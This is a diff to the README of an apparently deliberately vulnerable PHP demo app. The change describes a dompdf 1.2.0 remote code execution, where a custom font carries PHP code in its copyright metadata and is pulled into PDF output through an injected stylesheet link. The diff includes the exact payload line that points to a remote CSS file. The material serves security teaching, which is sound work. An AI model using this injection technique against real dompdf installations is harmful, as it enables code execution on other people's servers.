@@ -64,12 +64,18 @@ To run click the email icon next to a line entry to send an email reminder.
 
 Note: No emails will actually send or are being stored, only validating the email address entered into the input using the PHPMailer library. 
 
-### dompdf remote code execution 
+### dompdf 1.2.0 remote code execution 
 
-font called gotcha with phpinfo() in the meta data copyright
+This vulnerability is using dompdf library version 1.2.0 and allows for remote code execution on the target application. In this app there is a custom font called gotcha-normal.otf which has `<?php phpinfo(); ?>` loaded into the copyright font meta. 
 
-css references the server location (add a git path)
+The font file is then referenced as a `font-family` in the CSS file `gotcha.css` which is then injected into the dompdf html output via a stylesheet link. 
+
+Dompdf loads the style sheet and saves the custom font type to the dompdf font cache (and as part of the framework). This can then be remotely executed. 
+
+*** Note: in the CSS font-family, the font name needs to match the actual font name or this will not work. 
+
+To use this in this app, load the below code into a todo item and click pdf on its line entry
 
 ```
-http://localhost:8000/index.php?pdf&title=<link rel=stylesheet href='https://raw.githubusercontent.com/snyk-labs/php-goof/main/exploits/gotcha.css'>
+<link rel=stylesheet href='https://raw.githubusercontent.com/snyk-labs/php-goof/main/exploits/gotcha.css'>
 ```
